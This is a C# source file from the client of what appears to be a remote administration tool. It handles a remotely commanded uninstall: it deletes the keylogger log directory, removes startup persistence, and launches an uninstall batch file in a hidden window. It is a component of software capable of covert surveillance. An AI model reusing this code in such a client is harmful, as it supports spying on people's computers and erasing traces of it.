using System.Diagnostics;
using System.IO;
using xClient.Config;
using xClient.Core.Data;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Utilities;

namespace xClient.Core.Installation
{
    public static class ClientUninstaller
    {
        public static void Uninstall(Client client)
        {
            if (!Settings.INSTALL)
            {
                new Packets.ClientPackets.SetStatus("Uninstallation failed: Installation is not enabled").Execute(client);
                return;
            }

            RemoveExistingLogs();

            if (Settings.STARTUP)
                Startup.RemoveFromStartup();

            try
            {
                if (!FileHelper.ClearReadOnly(ClientData.CurrentPath))
                    new Packets.ClientPackets.SetStatus("Uninstallation failed: File is read-only").Execute(client);

                string batchFile = FileHelper.CreateUninstallBatch(Settings.INSTALL && Settings.HIDEFILE);

                if (string.IsNullOrEmpty(batchFile)) return;

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = true,
                    FileName = batchFile
                };
                Process.Start(startInfo);
            }
            finally
            {
                ClientData.Disconnect = true;
                client.Disconnect();
            }
        }

        public static void RemoveExistingLogs()
        {
            if (Directory.Exists(Keylogger.LogDirectory)) // try to delete Logs from Keylogger
            {
                try
                {
                    Directory.Delete(Keylogger.LogDirectory, true);
                }
                catch
                {
                }
            }
        }
    }
}
